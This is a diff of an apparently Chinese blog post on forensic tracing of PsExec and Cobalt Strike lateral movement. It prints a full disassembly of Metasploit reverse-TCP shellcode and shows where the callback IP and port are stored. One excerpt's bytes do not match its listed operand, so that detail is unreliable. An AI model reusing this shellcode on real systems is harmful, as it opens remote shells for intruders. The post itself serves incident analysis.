class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000000000:  FC                   cld    </span><br><span class="line">0x0000000000000001:  E8 82 00 00 00       call   0x88</span><br><span class="line">0x0000000000000006:  60                   pushal </span><br><span class="line">0x0000000000000007:  89 E5                mov    ebp, esp</span><br><span class="line">0x0000000000000009:  31 C0                xor    eax, eax</span><br><span class="line">0x000000000000000b:  64 8B 50 30          mov    edx, dword ptr fs:[eax + 0x30]</span><br><span class="line">0x000000000000000f:  8B 52 0C             mov    edx, dword ptr [edx + 0xc]</span><br><span class="line">0x0000000000000012:  8B 52 14             mov    edx, dword ptr [edx + 0x14]</span><br><span class="line">0x0000000000000015:  8B 72 28             mov    esi, dword ptr [edx + 0x28]</span><br><span class="line">0x0000000000000018:  0F B7 4A 26          movzx  ecx, word ptr [edx + 0x26]</span><br><span class="line">0x000000000000001c:  31 FF                xor    edi, edi</span><br><span class="line">0x000000000000001e:  AC                   lodsb  al, byte ptr [esi]</span><br><span class="line">0x000000000000001f:  3C 61                cmp    al, 0x61</span><br><span class="line">0x0000000000000021:  7C 02                jl     0x25</span><br><span class="line">0x0000000000000023:  2C 20                sub    al, 0x20</span><br><span class="line">0x0000000000000025:  C1 CF 0D             ror    edi, 0xd</span><br><span class="line">0x0000000000000028:  01 C7                add    edi, eax</span><br><span class="line">0x000000000000002a:  E2 F2                loop   0x1e</span><br><span class="line">0x000000000000002c:  52                   push   edx</span><br><span class="line">0x000000000000002d:  57                   push   edi</span><br><span class="line">0x000000000000002e:  8B 52 10             mov    edx, dword ptr [edx + 0x10]</span><br><span class="line">0x0000000000000031:  8B 4A 3C             mov    ecx, dword ptr [edx + 0x3c]</span><br><span class="line">0x0000000000000034:  8B 4C 11 78          mov    ecx, dword ptr [ecx + edx + 0x78]</span><br><span class="line">0x0000000000000038:  E3 48                jecxz  0x82</span><br><span class="line">0x000000000000003a:  01 D1                add    ecx, edx</span><br><span class="line">0x000000000000003c:  51                   push   ecx</span><br><span class="line">0x000000000000003d:  8B 59 20             mov    ebx, dword ptr [ecx + 0x20]</span><br><span class="line">0x0000000000000040:  01 D3                add    ebx, edx</span><br><span class="line">0x0000000000000042:  8B 49 18             mov    ecx, dword ptr [ecx + 0x18]</span><br><span class="line">0x0000000000000045:  E3 3A                jecxz  0x81</span><br><span class="line">0x0000000000000047:  49                   dec    ecx</span><br><span class="line">0x0000000000000048:  8B 34 8B             mov    esi, dword ptr [ebx + ecx*4]</span><br><span class="line">0x000000000000004b:  01 D6                add    esi, edx</span><br><span class="line">0x000000000000004d:  31 FF                xor    edi, edi</span><br><span class="line">0x000000000000004f:  AC                   lodsb  al, byte ptr [esi]</span><br><span class="line">0x0000000000000050:  C1 CF 0D             ror    edi, 0xd</span><br><span class="line">0x0000000000000053:  01 C7                add    edi, eax</span><br><span class="line">0x0000000000000055:  38 E0                cmp    al, ah</span><br><span class="line">0x0000000000000057:  75 F6                jne    0x4f</span><br><span class="line">0x0000000000000059:  03 7D F8             add    edi, dword ptr [ebp - 8]</span><br><span class="line">0x000000000000005c:  3B 7D 24             cmp    edi, dword ptr [ebp + 0x24]</span><br><span class="line">0x000000000000005f:  75 E4                jne    0x45</span><br><span class="line">0x0000000000000061:  58                   pop    eax</span><br><span class="line">0x0000000000000062:  8B 58 24             mov    ebx, dword ptr [eax + 0x24]</span><br><span class="line">0x0000000000000065:  01 D3                add    ebx, edx</span><br><span class="line">0x0000000000000067:  66 8B 0C 4B          mov    cx, word ptr [ebx + ecx*2]</span><br><span class="line">0x000000000000006b:  8B 58 1C             mov    ebx, dword ptr [eax + 0x1c]</span><br><span class="line">0x000000000000006e:  01 D3                add    ebx, edx</span><br><span class="line">0x0000000000000070:  8B 04 8B             mov    eax, dword ptr [ebx + ecx*4]</span><br><span class="line">0x0000000000000073:  01 D0                add    eax, edx</span><br><span class="line">0x0000000000000075:  89 44 24 24          mov    dword ptr [esp + 0x24], eax</span><br><span class="line">0x0000000000000079:  5B                   pop    ebx</span><br><span class="line">0x000000000000007a:  5B                   pop    ebx</span><br><span class="line">0x000000000000007b:  61                   popal  </span><br><span class="line">0x000000000000007c:  59                   pop    ecx</span><br><span class="line">0x000000000000007d:  5A                   pop    edx</span><br><span class="line">0x000000000000007e:  51                   push   ecx</span><br><span class="line">0x000000000000007f:  FF E0                jmp    eax</span><br><span class="line">0x0000000000000081:  5F                   pop    edi</span><br><span class="line">0x0000000000000082:  5F                   pop    edi</span><br><span class="line">0x0000000000000083:  5A                   pop    edx</span><br><span class="line">0x0000000000000084:  8B 12                mov    edx, dword ptr [edx]</span><br><span class="line">0x0000000000000086:  EB 8D                jmp    0x15</span><br><span class="line">0x0000000000000088:  5D                   pop    ebp</span><br><span class="line">0x0000000000000089:  68 33 32 00 00       push   0x3233</span><br><span class="line">0x000000000000008e:  68 77 73 32 5F       push   0x5f327377</span><br><span class="line">0x0000000000000093:  54                   push   esp</span><br><span class="line">0x0000000000000094:  68 4C 77 26 07       push   0x726774c</span><br><span class="line">0x0000000000000099:  89 E8                mov    eax, ebp</span><br><span class="line">0x000000000000009b:  FF D0                call   eax</span><br><span class="line">0x000000000000009d:  B8 90 01 00 00       mov    eax, 0x190</span><br><span class="line">0x00000000000000a2:  29 C4                sub    esp, eax</span><br><span class="line">0x00000000000000a4:  54                   push   esp</span><br><span class="line">0x00000000000000a5:  50                   push   eax</span><br><span class="line">0x00000000000000a6:  68 29 80 6B 00       push   0x6b8029</span><br><span class="line">0x00000000000000ab:  FF D5                call   ebp</span><br><span class="line">0x00000000000000ad:  6A 0A                push   0xa</span><br><span class="line">0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0</span><br><span class="line">0x00000000000000b4:  68 02 00 1E 60       push   0x601e0002</span><br><span class="line">0x00000000000000b9:  89 E6                mov    esi, esp</span><br><span class="line">0x00000000000000bb:  50                   push   eax</span><br><span class="line">0x00000000000000bc:  50                   push   eax</span><br><span class="line">0x00000000000000bd:  50                   push   eax</span><br><span class="line">0x00000000000000be:  50                   push   eax</span><br><span class="line">0x00000000000000bf:  40                   inc    eax</span><br><span class="line">0x00000000000000c0:  50                   push   eax</span><br><span class="line">0x00000000000000c1:  40                   inc    eax</span><br><span class="line">0x00000000000000c2:  50                   push   eax</span><br><span class="line">0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea</span><br><span class="line">0x00000000000000c8:  FF D5                call   ebp</span><br><span class="line">0x00000000000000ca:  97                   xchg   eax, edi</span><br><span class="line">0x00000000000000cb:  6A 10                push   0x10</span><br><span class="line">0x00000000000000cd:  56                   push   esi</span><br><span class="line">0x00000000000000ce:  57                   push   edi</span><br><span class="line">0x00000000000000cf:  68 99 A5 74 61       push   0x6174a599</span><br><span class="line">0x00000000000000d4:  FF D5                call   ebp</span><br><span class="line">0x00000000000000d6:  85 C0                test   eax, eax</span><br><span class="line">0x00000000000000d8:  74 0A                je     0xe4</span><br><span class="line">0x00000000000000da:  FF 4E 08             dec    dword ptr [esi + 8]</span><br><span class="line">0x00000000000000dd:  75 EC                jne    0xcb</span><br><span class="line">0x00000000000000df:  E8 67 00 00 00       call   0x14b</span><br><span class="line">0x00000000000000e4:  6A 00                push   0</span><br><span class="line">0x00000000000000e6:  6A 04                push   4</span><br><span class="line">0x00000000000000e8:  56                   push   esi</span><br><span class="line">0x00000000000000e9:  57                   push   edi</span><br><span class="line">0x00000000000000ea:  68 02 D9 C8 5F       push   0x5fc8d902</span><br><span class="line">0x00000000000000ef:  FF D5                call   ebp</span><br><span class="line">0x00000000000000f1:  83 F8 00             cmp    eax, 0</span><br><span class="line">0x00000000000000f4:  7E 36                jle    0x12c</span><br><span class="line">0x00000000000000f6:  8B 36                mov    esi, dword ptr [esi]</span><br><span class="line">0x00000000000000f8:  6A 40                push   0x40</span><br><span class="line">0x00000000000000fa:  68 00 10 00 00       push   0x1000</span><br><span class="line">0x00000000000000ff:  56                   push   esi</span><br><span class="line">0x0000000000000100:  6A 00                push   0</span><br><span class="line">0x0000000000000102:  68 58 A4 53 E5       push   0xe553a458</span><br><span class="line">0x0000000000000107:  FF D5                call   ebp</span><br><span class="line">0x0000000000000109:  93                   xchg   eax, ebx</span><br><span class="line">0x000000000000010a:  53                   push   ebx</span><br><span class="line">0x000000000000010b:  6A 00                push   0</span><br><span class="line">0x000000000000010d:  56                   push   esi</span><br><span class="line">0x000000000000010e:  53                   push   ebx</span><br><span class="line">0x000000000000010f:  57                   push   edi</span><br><span class="line">0x0000000000000110:  68 02 D9 C8 5F       push   0x5fc8d902</span><br><span class="line">0x0000000000000115:  FF D5                call   ebp</span><br><span class="line">0x0000000000000117:  83 F8 00             cmp    eax, 0</span><br><span class="line">0x000000000000011a:  7D 28                jge    0x144</span><br><span class="line">0x000000000000011c:  58                   pop    eax</span><br><span class="line">0x000000000000011d:  68 00 40 00 00       push   0x4000</span><br><span class="line">0x0000000000000122:  6A 00                push   0</span><br><span class="line">0x0000000000000124:  50                   push   eax</span><br><span class="line">0x0000000000000125:  68 0B 2F 0F 30       push   0x300f2f0b</span><br><span class="line">0x000000000000012a:  FF D5                call   ebp</span><br><span class="line">0x000000000000012c:  57                   push   edi</span><br><span class="line">0x000000000000012d:  68 75 6E 4D 61       push   0x614d6e75</span><br><span class="line">0x0000000000000132:  FF D5                call   ebp</span><br><span class="line">0x0000000000000134:  5E                   pop    esi</span><br><span class="line">0x0000000000000135:  5E                   pop    esi</span><br><span class="line">0x0000000000000136:  FF 0C 24             dec    dword ptr [esp]</span><br><span class="line">0x0000000000000139:  0F 85 70 FF FF FF    jne    0xaf</span><br><span class="line">0x000000000000013f:  E9 9B FF FF FF       jmp    0xdf</span><br><span class="line">0x0000000000000144:  01 C3                add    ebx, eax</span><br><span class="line">0x0000000000000146:  29 C6                sub    esi, eax</span><br><span class="line">0x0000000000000148:  75 C1                jne    0x10b</span><br><span class="line">0x000000000000014a:  C3                   ret    </span><br><span class="line">0x000000000000014b:  BB E0 1D 2A 0A       mov    ebx, 0xa2a1de0</span><br><span class="line">0x0000000000000150:  68 A6 95 BD 9D       push   0x9dbd95a6</span><br><span class="line">0x0000000000000155:  FF D5                call   ebp</span><br><span class="line">0x0000000000000157:  3C 06                cmp    al, 6</span><br><span class="line">0x0000000000000159:  7C 0A                jl     0x165</span><br><span class="line">0x000000000000015b:  80 FB E0             cmp    bl, 0xe0</span><br><span class="line">0x000000000000015e:  75 05                jne    0x165</span><br><span class="line">0x0000000000000160:  BB 47 13 72 6F       mov    ebx, 0x6f721347</span><br><span class="line">0x0000000000000165:  6A 00                push   0</span><br><span class="line">0x0000000000000167:  53                   push   ebx</span><br><span class="line">0x0000000000000168:  FF D5                call   ebp</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="asm">0x0000000000000000:  FC                   cld    
+0x0000000000000001:  E8 82 00 00 00       call   0x88
+0x0000000000000006:  60                   pushal 
+0x0000000000000007:  89 E5                mov    ebp, esp
+0x0000000000000009:  31 C0                xor    eax, eax
+0x000000000000000b:  64 8B 50 30          mov    edx, dword ptr fs:[eax + 0x30]
+0x000000000000000f:  8B 52 0C             mov    edx, dword ptr [edx + 0xc]
+0x0000000000000012:  8B 52 14             mov    edx, dword ptr [edx + 0x14]
+0x0000000000000015:  8B 72 28             mov    esi, dword ptr [edx + 0x28]
+0x0000000000000018:  0F B7 4A 26          movzx  ecx, word ptr [edx + 0x26]
+0x000000000000001c:  31 FF                xor    edi, edi
+0x000000000000001e:  AC                   lodsb  al, byte ptr [esi]
+0x000000000000001f:  3C 61                cmp    al, 0x61
+0x0000000000000021:  7C 02                jl     0x25
+0x0000000000000023:  2C 20                sub    al, 0x20
+0x0000000000000025:  C1 CF 0D             ror    edi, 0xd
+0x0000000000000028:  01 C7                add    edi, eax
+0x000000000000002a:  E2 F2                loop   0x1e
+0x000000000000002c:  52                   push   edx
+0x000000000000002d:  57                   push   edi
+0x000000000000002e:  8B 52 10             mov    edx, dword ptr [edx + 0x10]
+0x0000000000000031:  8B 4A 3C             mov    ecx, dword ptr [edx + 0x3c]
+0x0000000000000034:  8B 4C 11 78          mov    ecx, dword ptr [ecx + edx + 0x78]
+0x0000000000000038:  E3 48                jecxz  0x82
+0x000000000000003a:  01 D1                add    ecx, edx
+0x000000000000003c:  51                   push   ecx
+0x000000000000003d:  8B 59 20             mov    ebx, dword ptr [ecx + 0x20]
+0x0000000000000040:  01 D3                add    ebx, edx
+0x0000000000000042:  8B 49 18             mov    ecx, dword ptr [ecx + 0x18]
+0x0000000000000045:  E3 3A                jecxz  0x81
+0x0000000000000047:  49                   dec    ecx
+0x0000000000000048:  8B 34 8B             mov    esi, dword ptr [ebx + ecx*4]
+0x000000000000004b:  01 D6                add    esi, edx
+0x000000000000004d:  31 FF                xor    edi, edi
+0x000000000000004f:  AC                   lodsb  al, byte ptr [esi]
+0x0000000000000050:  C1 CF 0D             ror    edi, 0xd
+0x0000000000000053:  01 C7                add    edi, eax
+0x0000000000000055:  38 E0                cmp    al, ah
+0x0000000000000057:  75 F6                jne    0x4f
+0x0000000000000059:  03 7D F8             add    edi, dword ptr [ebp - 8]
+0x000000000000005c:  3B 7D 24             cmp    edi, dword ptr [ebp + 0x24]
+0x000000000000005f:  75 E4                jne    0x45
+0x0000000000000061:  58                   pop    eax
+0x0000000000000062:  8B 58 24             mov    ebx, dword ptr [eax + 0x24]
+0x0000000000000065:  01 D3                add    ebx, edx
+0x0000000000000067:  66 8B 0C 4B          mov    cx, word ptr [ebx + ecx*2]
+0x000000000000006b:  8B 58 1C             mov    ebx, dword ptr [eax + 0x1c]
+0x000000000000006e:  01 D3                add    ebx, edx
+0x0000000000000070:  8B 04 8B             mov    eax, dword ptr [ebx + ecx*4]
+0x0000000000000073:  01 D0                add    eax, edx
+0x0000000000000075:  89 44 24 24          mov    dword ptr [esp + 0x24], eax
+0x0000000000000079:  5B                   pop    ebx
+0x000000000000007a:  5B                   pop    ebx
+0x000000000000007b:  61                   popal  
+0x000000000000007c:  59                   pop    ecx
+0x000000000000007d:  5A                   pop    edx
+0x000000000000007e:  51                   push   ecx
+0x000000000000007f:  FF E0                jmp    eax
+0x0000000000000081:  5F                   pop    edi
+0x0000000000000082:  5F                   pop    edi
+0x0000000000000083:  5A                   pop    edx
+0x0000000000000084:  8B 12                mov    edx, dword ptr [edx]
+0x0000000000000086:  EB 8D                jmp    0x15
+0x0000000000000088:  5D                   pop    ebp
+0x0000000000000089:  68 33 32 00 00       push   0x3233
+0x000000000000008e:  68 77 73 32 5F       push   0x5f327377
+0x0000000000000093:  54                   push   esp
+0x0000000000000094:  68 4C 77 26 07       push   0x726774c
+0x0000000000000099:  89 E8                mov    eax, ebp
+0x000000000000009b:  FF D0                call   eax
+0x000000000000009d:  B8 90 01 00 00       mov    eax, 0x190
+0x00000000000000a2:  29 C4                sub    esp, eax
+0x00000000000000a4:  54                   push   esp
+0x00000000000000a5:  50                   push   eax
+0x00000000000000a6:  68 29 80 6B 00       push   0x6b8029
+0x00000000000000ab:  FF D5                call   ebp
+0x00000000000000ad:  6A 0A                push   0xa
+0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0
+0x00000000000000b4:  68 02 00 1E 60       push   0x601e0002
+0x00000000000000b9:  89 E6                mov    esi, esp
+0x00000000000000bb:  50                   push   eax
+0x00000000000000bc:  50                   push   eax
+0x00000000000000bd:  50                   push   eax
+0x00000000000000be:  50                   push   eax
+0x00000000000000bf:  40                   inc    eax
+0x00000000000000c0:  50                   push   eax
+0x00000000000000c1:  40                   inc    eax
+0x00000000000000c2:  50                   push   eax
+0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea
+0x00000000000000c8:  FF D5                call   ebp
+0x00000000000000ca:  97                   xchg   eax, edi
+0x00000000000000cb:  6A 10                push   0x10
+0x00000000000000cd:  56                   push   esi
+0x00000000000000ce:  57                   push   edi
+0x00000000000000cf:  68 99 A5 74 61       push   0x6174a599
+0x00000000000000d4:  FF D5                call   ebp
+0x00000000000000d6:  85 C0                test   eax, eax
+0x00000000000000d8:  74 0A                je     0xe4
+0x00000000000000da:  FF 4E 08             dec    dword ptr [esi + 8]
+0x00000000000000dd:  75 EC                jne    0xcb
+0x00000000000000df:  E8 67 00 00 00       call   0x14b
+0x00000000000000e4:  6A 00                push   0
+0x00000000000000e6:  6A 04                push   4
+0x00000000000000e8:  56                   push   esi
+0x00000000000000e9:  57                   push   edi
+0x00000000000000ea:  68 02 D9 C8 5F       push   0x5fc8d902
+0x00000000000000ef:  FF D5                call   ebp
+0x00000000000000f1:  83 F8 00             cmp    eax, 0
+0x00000000000000f4:  7E 36                jle    0x12c
+0x00000000000000f6:  8B 36                mov    esi, dword ptr [esi]
+0x00000000000000f8:  6A 40                push   0x40
+0x00000000000000fa:  68 00 10 00 00       push   0x1000
+0x00000000000000ff:  56                   push   esi
+0x0000000000000100:  6A 00                push   0
+0x0000000000000102:  68 58 A4 53 E5       push   0xe553a458
+0x0000000000000107:  FF D5                call   ebp
+0x0000000000000109:  93                   xchg   eax, ebx
+0x000000000000010a:  53                   push   ebx
+0x000000000000010b:  6A 00                push   0
+0x000000000000010d:  56                   push   esi
+0x000000000000010e:  53                   push   ebx
+0x000000000000010f:  57                   push   edi
+0x0000000000000110:  68 02 D9 C8 5F       push   0x5fc8d902
+0x0000000000000115:  FF D5                call   ebp
+0x0000000000000117:  83 F8 00             cmp    eax, 0
+0x000000000000011a:  7D 28                jge    0x144
+0x000000000000011c:  58                   pop    eax
+0x000000000000011d:  68 00 40 00 00       push   0x4000
+0x0000000000000122:  6A 00                push   0
+0x0000000000000124:  50                   push   eax
+0x0000000000000125:  68 0B 2F 0F 30       push   0x300f2f0b
+0x000000000000012a:  FF D5                call   ebp
+0x000000000000012c:  57                   push   edi
+0x000000000000012d:  68 75 6E 4D 61       push   0x614d6e75
+0x0000000000000132:  FF D5                call   ebp
+0x0000000000000134:  5E                   pop    esi
+0x0000000000000135:  5E                   pop    esi
+0x0000000000000136:  FF 0C 24             dec    dword ptr [esp]
+0x0000000000000139:  0F 85 70 FF FF FF    jne    0xaf
+0x000000000000013f:  E9 9B FF FF FF       jmp    0xdf
+0x0000000000000144:  01 C3                add    ebx, eax
+0x0000000000000146:  29 C6                sub    esi, eax
+0x0000000000000148:  75 C1                jne    0x10b
+0x000000000000014a:  C3                   ret    
+0x000000000000014b:  BB E0 1D 2A 0A       mov    ebx, 0xa2a1de0
+0x0000000000000150:  68 A6 95 BD 9D       push   0x9dbd95a6
+0x0000000000000155:  FF D5                call   ebp
+0x0000000000000157:  3C 06                cmp    al, 6
+0x0000000000000159:  7C 0A                jl     0x165
+0x000000000000015b:  80 FB E0             cmp    bl, 0xe0
+0x000000000000015e:  75 05                jne    0x165
+0x0000000000000160:  BB 47 13 72 6F       mov    ebx, 0x6f721347
+0x0000000000000165:  6A 00                push   0
+0x0000000000000167:  53                   push   ebx
+0x0000000000000168:  FF D5                call   ebp
+</code></pre>
 <p>显然，这是msf的生成的默认shellcode，其中在偏移<code>0x000af</code>和<code>0x000b4</code>处，分别为反弹的十六进制IP地址以及端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00000000000000ad:  6A 0A                push   0xa</span><br><span class="line">0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0</span><br><span class="line">0x00000000000000b4:  68 02 00 11 46       push   0x601e0002</span><br><span class="line">0x00000000000000b9:  89 E6                mov    esi, esp</span><br><span class="line">0x00000000000000bb:  50                   push   eax</span><br><span class="line">0x00000000000000bc:  50                   push   eax</span><br><span class="line">0x00000000000000bd:  50                   push   eax</span><br><span class="line">0x00000000000000be:  50                   push   eax</span><br><span class="line">0x00000000000000bf:  40                   inc    eax</span><br><span class="line">0x00000000000000c0:  50                   push   eax</span><br><span class="line">0x00000000000000c1:  40                   inc    eax</span><br><span class="line">0x00000000000000c2:  50                   push   eax</span><br><span class="line">0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea</span><br><span class="line">0x00000000000000c8:  FF D5                call   ebp</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="asm">0x00000000000000ad:  6A 0A                push   0xa
+0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0
+0x00000000000000b4:  68 02 00 11 46       push   0x601e0002
+0x00000000000000b9:  89 E6                mov    esi, esp
+0x00000000000000bb:  50                   push   eax
+0x00000000000000bc:  50                   push   eax
+0x00000000000000bd:  50                   push   eax
+0x00000000000000be:  50                   push   eax
+0x00000000000000bf:  40                   inc    eax
+0x00000000000000c0:  50                   push   eax
+0x00000000000000c1:  40                   inc    eax
+0x00000000000000c2:  50                   push   eax
+0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea
+0x00000000000000c8:  FF D5                call   ebp
+</code></pre>
 <p>偷懒直接在线转了 <a href="http://redmark.site/tools/ip_converter.htm" target="_blank" rel="noopener">IP地址转换</a></p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325170635618.png" alt="image-20200325170635618"></p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325170854141.png" alt="image-20200325170854141"></p>
 <p>唯一要注意的是参数是小端存储的</p>
 <p>于是我们在溯源时可以按步骤提取，寻找上一个跳板机，说不定会有更大的收获呢。</p>
-<h2 id="4-补充"><a href="#4-补充" class="headerlink" title="4. 补充"></a>4. 补充</h2><h3 id="4-1-CS的Psexec-bind-smb-listener"><a href="#4-1-CS的Psexec-bind-smb-listener" class="headerlink" title="4.1 CS的Psexec(bind_smb_listener)"></a>4.1 CS的Psexec(bind_smb_listener)</h3><p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
+<h2 id="4-补充"><a class="markdownIt-Anchor" href="#4-补充"></a> 4. 补充</h2>
+<h3 id="41-cs的psexecbind_smb_listener"><a class="markdownIt-Anchor" href="#41-cs的psexecbind_smb_listener"></a> 4.1 CS的Psexec(bind_smb_listener)</h3>
+<p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
 <ol>
 <li>远程创建服务（随机服务名）；</li>
 <li>启动服务调用<code>%ComSpec%</code>(cmd.exe)，运行powershell脚本，脚本会本地创建用于传输Stager的通道<code>staus_xxx</code>以及后续数据传输管道<code>msagent_xxx</code>；</li>
@@ -321,6 +540,9 @@
 </footer>
 
 -->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
     </div>
 <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
